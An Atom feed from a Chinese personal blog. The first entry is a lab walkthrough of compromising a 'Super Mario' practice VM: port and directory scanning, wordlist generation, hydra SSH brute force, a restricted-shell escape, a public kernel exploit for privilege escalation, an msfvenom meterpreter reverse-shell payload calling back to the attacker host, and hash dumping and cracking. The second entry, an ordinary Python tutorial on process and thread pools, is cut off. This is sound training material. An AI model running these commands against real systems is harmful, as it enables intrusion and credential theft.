<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Demos&#39;s Blog</title>
  
  <subtitle>It&#39;s A Long Road</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.lsowl.xyz/"/>
  <updated>2018-08-19T12:20:59.959Z</updated>
  <id>https://www.lsowl.xyz/</id>
  
  <author>
    <name>Demos</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>超级玛丽靶机渗透</title>
    <link href="https://www.lsowl.xyz/2018/08/19/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://www.lsowl.xyz/2018/08/19/靶机渗透/</id>
    <published>2018-08-19T12:19:26.000Z</published>
    <updated>2018-08-19T12:20:59.959Z</updated>
    
    <content type="html"><![CDATA[<h3 id="靶机渗透"><a href="#靶机渗透" class="headerlink" title="靶机渗透"></a>靶机渗透</h3><blockquote><p>以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。<a href="https://www.anquanke.com/post/id/146527" target="_blank" rel="noopener">原文链接</a></p></blockquote><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>靶机IP：192.168.0.105</p><p>攻击主机IP：192.168.0.106</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675443.65.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675463.94.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675493.83.png" alt=""></p><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><ul><li><p>靶机只有一个登陆界面，所以端口扫描来一波</p><p><code>nmap.exe -sV -p- -T5 192.168.0.105</code></p></li><li><p>发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现啥都没有，目录扫描走一波 <code>sudo dirb http://192.168.0.105:8180 /usr/share/dirb/wordlists/big.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675825.29.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676045.55.png" alt=""></p></li><li><p>发现一个vhosts目录，访问以后得到如下信息：发现有服务名，修改本地hosts文件访问一下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676106.23.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676228.18.png" alt=""></p></li><li><p>然后访问[<a href="http://mario.supermariohost.local:8180/" target="_blank" rel="noopener">http://mario.supermariohost.local:8180/</a> 得到如下界面，并没有发现什么有用的信息，再来一次目录扫描（这里说明一下，本来是没有扫到东西的，所以看了一下原文，发现是扫出来的，也许是字典进行了改进，在后文评论中看到马里奥的弟弟是luigi ，emmm。。果然是）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676343.44.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676499.19.png" alt=""></p></li><li><p>访问一下地址：发现一串英文，利用cewl对连接进行爬取然后生成一个自定义的字典 ，这里是对一些单词的提取，针对可能有用的进行提取<code>cewl &lt;http://mario.supermariohost.local:8180/&gt; -d -w /root/Desktop/666.txt</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676681.24.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676860.62.png" alt=""></p></li><li><p>利用生成的自定义字典使用john生成一个自定义的密码字典 <code>john --wordlist=/home/dest/666.txt --stdout --rules &gt; 777.txt</code> 这里联想到前面的那个目录luigi和生成的密码，然后对22端口进行爆破</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677018.46.png" alt=""></p><p><code>hydra -l luigi -P /home/toml/777.txt 192.168.0.105 ssh -t 20</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677247.99.png" alt=""></p></li><li><p>得到ssh的账号密码，进行登录，登录成功以后发现shell权限被限制了，和python进行沙盒逃逸挺像的<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677310.05.png" alt=""></p></li><li><p>在原文中有一篇关于内网渗透中绕过shell限制的文章：<a href="http://www.4hou.com/penetration/11674.html" target="_blank" rel="noopener">www.4hou.com/penetration/11674.html</a> ，通过awk ‘BEGIN{system(“/bin/bash”)}’ 绕过限制,由于测试过进行总结，所以靶机再没重启<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677502.15.png" alt=""></p></li><li><p>然后进行提权：通过查看内核发现是3.13.0的内核版本，通过公开的提权程序进行提权：<a href="https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行" target="_blank" rel="noopener">https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行</a> <code>gcc 77.c -o test</code> 拿到root权限</p></li><li><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677631.83.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677718.08.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677870.96.png" alt=""></p></li><li><p>提权成功后在root目录下发现了flag.zip,解压发现需要密码：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678061.53.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678103.78.png" alt=""></p></li><li><p>将靶机上的flag压缩包下载到本地，利用msf生成后门程序，在靶机上下载执行：</p><p><code>sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=7777 -f elf &gt; /var/www/html/5.elf</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678360.95.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678383.77.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678435.94.png" alt=""></p></li><li><p>利用fcrackzip爆破压缩包的密码 <code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678550.51.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678577.38.png" alt=""></p></li><li><p>查看flag发现要拿到所有的账户密码，这个时候已经在msf上反弹shell了，所以先把所有的hash抓下来</p><p><code>run post/linux/gather/hashdump</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678687.04.png" alt=""></p></li><li><p>然后利用刚才破解的压缩包密码生成字典，将密码保存到一个新的文件夹中，然后生成</p><p><code>john --wordlist=/home/toml/newpass.txt --stdout --rules &gt; newpasse.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678803.4.png" alt=""></p></li><li><p>加载字典，然后本地破解hash，得到所有的账户密码：</p><p><code>john --wordlist=/home/toml/newpasse.txt /home/toml/.msf4/loot/20180819175754_default_192.168.0.105_linux.hashes_331263.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678908.77.png" alt=""></p></li><li><p>利用得到的账户密码均登陆成功：渗透完成<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534679220.15.png" alt=""></p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>本次靶机的渗透测试，看了表哥的文章，思路清晰，收获很多，是一次学习的过程。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;靶机渗透&quot;&gt;&lt;a href=&quot;#靶机渗透&quot; class=&quot;headerlink&quot; title=&quot;靶机渗透&quot;&gt;&lt;/a&gt;靶机渗透&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。&lt;a href=&quot;h
      
    
    </summary>
    
      <category term="渗透" scheme="https://www.lsowl.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="https://www.lsowl.xyz/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="靶机" scheme="https://www.lsowl.xyz/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>python进程池和线程池</title>
    <link href="https://www.lsowl.xyz/2018/06/28/python%E8%BF%9B%E7%A8%8B%E6%B1%A0%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    <id>https://www.lsowl.xyz/2018/06/28/python进程池和线程池/</id>
    <published>2018-06-28T11:53:09.000Z</published>
    <updated>2018-06-28T11:58:23.219Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python进程池和线程池学习"><a href="#python进程池和线程池学习" class="headerlink" title="python进程池和线程池学习"></a>python进程池和线程池学习</h2><blockquote><p>前几天学习了python的多进程通信，是python标准库中支持的多进程并发模块multiprocessing ，主要学习了它常用的两个类和几种进程间通信的方法，本文基于这一点继续拓展python的并发中的线程池和进程池。</p></blockquote><h3 id="多进程和多线程"><a href="#多进程和多线程" class="headerlink" title="多进程和多线程"></a>多进程和多线程</h3><blockquote><p>按照书上的话来说“进程是资源分配的最小单位，线程是CPU调度的最小单位 ”但在实际中要分清楚它们的区别与联系才可以运用好多线程和多进程。多进程与多线程的区别 进程是程序在计算机上的一次执行活动。当你运行一个程序，你就启动了一个进程。显然，程序是死的(静态的)，进程是活的(动态的)。进程可以分为系统进程和用户进程。凡是用于完成操作系统的各种功能的进程就是系统进程，它们就是处于运行状态下的操作系统本身；所有由你启动的进程都是用户进程。进程是操作系统进行资源分配的单位。在Windows下，进程又被细化为线程，也就是一个进程下有多个能独立运行的更小的单位。 在同一个时间里，同一个计算机系统中如果允许两个或两个以上的进程处于运行状态，这便是多任务。 </p></blockquote><ul><li>先贴一张图来看多线程和多进程再不同维度的对比：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530154912.57.png" alt=""></li><li>基于上图总结：<ul><li>需要频繁创建销毁的优先使用多线程，常见的是web服务器，来一个请求，建立一次连接、通信结束以后销毁连接，所以要使用多线程，如果使用多进程，创建和销毁的代价非常大。</li><li>需要进行大量计算的优先使用多线程，由于大量计算需要消耗大量的CPU资源、切换频繁，如图像处理、算法处理，使用多线程切换简单，CPU的利用率高。</li><li>处理关系相关性强的优先用多进程、相关性弱的优先用多线程。比如：服务器进行消息的收发和消息的处理，相关性不是很强，使用多进程可以提高并发速度；针对消息的处理有消息解码、业务处理等多种方式，这个时候需要数据间的共享，使用多线程会提高并发速度。</li><li>基于分布式的多核多机的优先使用多进程。</li><li>满足不同的需求，结合它们的特性选用合理的方式。</li></ul></li></ul><h3 id="通过队列实现多线程和多进程的并发"><a href="#通过队列实现多线程和多进程的并发" class="headerlink" title="通过队列实现多线程和多进程的并发"></a>通过队列实现多线程和多进程的并发</h3><ol><li><p>使用multiprocessing.JoinableQueue实现多进程并发</p><blockquote><p>JoinableQueue是multiprocessing的一种数据结构，它本质上是一个FIFO队列，它与一般队列的不同在于它的多进程是安全的，会自动解决互斥和死锁的问题。JoinableQueue主要可以用来存放执行的任务和收集任务的执行结果。 </p></blockquote><ul><li><p>通过多进程并发打印26个字母</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> JoinableQueue</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> random, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#这里是多进程并发的要点，q是一个JoinableQueue对象，支持get方法读取第一个元素，如果q中没有元素，进程就会阻塞，直至q中被存入新元素</span></span><br><span class="line">            value = q.get()</span><br><span class="line">            print(<span class="string">'GET &#123;&#125; from queue.'</span>.format(value))</span><br><span class="line">            time.sleep(random.random())</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            q.task_done()</span><br><span class="line"><span class="comment">#通过多进程将26个字母打印出来</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#定义一个存放任务的JoinableQueue对象</span></span><br><span class="line">    q = multiprocessing.JoinableQueue()</span><br><span class="line">    <span class="comment">#实例化两个Process对象（每个对象对应一个子进程）target是实现每个任务工作中的具体函数，args是target函数的参数</span></span><br><span class="line">    pw1 = multiprocessing.Process(target=read, args=(q,))</span><br><span class="line">    pw2 = multiprocessing.Process(target=read, args=(q,))</span><br><span class="line">    <span class="comment">#将子进程设为守护进程———在主进程结束后随之结束</span></span><br><span class="line">    pw1.daemon = <span class="keyword">True</span></span><br><span class="line">    pw2.daemon = <span class="keyword">True</span></span><br><span class="line">    <span class="comment">#子进程就开始独立于父进程运行了，它会在单独的进程里调用target引用的函数——在这里即read函数，它是一个死循环，将参数q中的数一一读取并打印出来</span></span><br><span class="line">    pw1.start()</span><br><span class="line">    pw2.start()</span><br><span class="line">    <span class="comment">#实际上start执行以后进程就阻塞了，由于JoinableQueue对象没有传入元素，等待传入元素才开始执行</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [chr(ord(<span class="string">'A'</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>)]:</span><br><span class="line">        q.put(x)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#这里是查询q中的数据是否已经读完，如果没有读完阻塞程序，等待q中的数据读完才开始继续执行</span></span><br><span class="line">        q.join()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">'stopped by hand'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530162034.1.png" alt=""></p></li><li><p>通过这个实例可以看出python通过JoinableQueue实现多进程并发的优雅</p></li></ul></li><li><p>通过队列实现多线程的并发</p><blockquote><p>程序的实现与多进程差别不大，只是这里不用multiProcessing.JoinableQueue进行队列的操作，一般的队列就可以满足要求</p></blockquote><ul><li><p>通过队列实现多线程并发实例：打印26个字母（代码和多进程的差别并不大）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time, random</span><br><span class="line"><span class="keyword">import</span> threading, queue</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value = q.get()</span><br><span class="line">            print(<span class="string">'GET &#123;&#125; from queue.'</span>.format(value))</span><br><span class="line">            time.sleep(random.random())</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            q.task_done()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    pw1 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    pw2 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    pw1.daemon = <span class="keyword">True</span></span><br><span class="line">    pw2.daemon = <span class="keyword">True</span></span><br><span class="line">    pw1.start()</span><br><span class="line">    pw2.start()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [chr(ord(<span class="string">'A'</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>)]:</span><br><span class="line">        q.put(x)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        q.join()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">'stopped by hand'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530162960.12.png" alt=""></p></li></ul></li></ol><h3 id="多线程补充"><a href="#多线程补充" class="headerlink" title="多线程补充"></a>多线程补充</h3><blockquote><p>既然说到了用队列实现多线程并发，再补充通过threading初始化，不调用队列实现多线程并发，这里要多出一个线程不安全的问题，用线程锁来解决</p></blockquote><ol><li><p>不设计线程锁实例：(以前测试的时候出现线程不安全的问题，现在运行以后没有了，应该是python版本的修复)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> n</span><br><span class="line">        print(n,self.name)</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"__main__"</span> == __name__:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    ThreadList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        t = MyThread()</span><br><span class="line">        ThreadList.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.join</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530163771.85.png" alt=""></p></li><li><p>设计线程锁的实例（尽管现在测试没有出现线程不安全的问题，还是将它作为补充）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> n, lock</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            print(n , self.name)</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"__main__"</span> == __name__:</span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    ThreadList = []</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        t = MyThread()</span><br><span class="line">        ThreadList.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530163912.26.png" alt=""></p></li></ol><h3 id="通过进程池和线程池来实现并发设计"><a href="#通过进程池和线程池来实现并发设计" class="headerlink" title="通过进程池和线程池来实现并发设计"></a>通过进程池和线程池来实现并发设计</h3><blockquote><p>通过进程池和线程池实现并发设计，也算是对上一篇多进程学习的补充与应用</p></blockquote><h4 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h4><blockquote><p>进程池的使用有四种方式：apply_async、apply、map_async、map。其中apply_async和map_async是异步的，也就是启动进程函数之后会继续执行后续的代码不用等待进程函数返回。apply_async和map_async方式提供了一些获取进程函数状态的函数：ready()、successful()、get()。join()放在close()后面，是多进程中说到过的</p></blockquote><ul><li>通过一个实例来体现Python的进程池中的四种方法的特点，主要的区别是在异步</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">'msg:'</span>,msg)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'func_return: %s'</span> % msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#apply_async</span></span><br><span class="line">    print(<span class="string">'\n------apply_async--------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg = <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply_async(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply_async:不阻塞'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        i.wait()     <span class="comment">#等待进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> i.ready():            <span class="comment">#判断进程函数是否已经启动了</span></span><br><span class="line">            <span class="keyword">if</span> i.successful():   <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">                print(i.get())   <span class="comment">#输出进程函数的返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#apply</span></span><br><span class="line">    print(<span class="string">'\n----------apply---------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg =  <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply:阻塞'</span>)           <span class="comment">#执行完func才可以执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(results)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map</span></span><br><span class="line">    print(<span class="string">'\n---------map-----------'</span>)</span><br><span class="line">    args = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">5</span>)</span><br><span class="line">    return_data = pool.map(func,args)</span><br><span class="line">    print(<span class="string">'map:阻塞'</span>) <span class="comment">#执行完func才执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(return_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map_async</span></span><br><span class="line">    print(<span class="string">'\n-------map_async---------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">5</span>)</span><br><span class="line">    result = pool.map_async(func,args)</span><br><span class="line">    print(<span class="string">'ready:'</span>,result.ready())</span><br><span class="line">    print(<span class="string">'不阻塞'</span>)</span><br><span class="line">    result.wait()  <span class="comment">#等待所有进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result.ready():           <span class="comment">#判断进程函是否已经启动了</span></span><br><span class="line">        <span class="keyword">if</span> result.successful():  <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">            print(result.get())  <span class="comment">#输出进程函数的返回值</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530167366.44.png" alt=""></p><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><blockquote><p>线程池使用multiprocessing提供的线程池，线程池的使用有四种方式：apply_async、apply、map_async、map，代码与进程池类似。下面直接贴代码，实现的过程与进程池基本一致</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 